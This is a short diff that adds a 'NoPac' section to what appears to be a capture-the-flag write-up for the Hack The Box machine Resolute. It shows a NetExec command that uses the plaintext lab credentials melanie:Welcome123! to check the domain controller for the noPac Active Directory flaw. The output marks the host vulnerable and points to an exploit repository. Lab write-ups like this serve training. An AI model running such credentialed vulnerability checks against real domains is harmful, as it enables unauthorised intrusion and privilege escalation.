@@ -389,5 +389,15 @@ melanie:Welcome123!
 
 ## NoPac
 
-
+```python
+faketime '20:19:17.832439' nxc smb resolute.megabank.local -u melanie -p 'Welcome123!' -M nopac
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+NOPAC       10.129.96.155   445    RESOLUTE         TGT with PAC size 1470
+NOPAC       10.129.96.155   445    RESOLUTE         TGT without PAC size 721
+NOPAC       10.129.96.155   445    RESOLUTE         
+NOPAC       10.129.96.155   445    RESOLUTE         VULNERABLE
+NOPAC       10.129.96.155   445    RESOLUTE         Next step: https://github.com/Ridter/noPac
+```
+Nxc identified it as vul
 
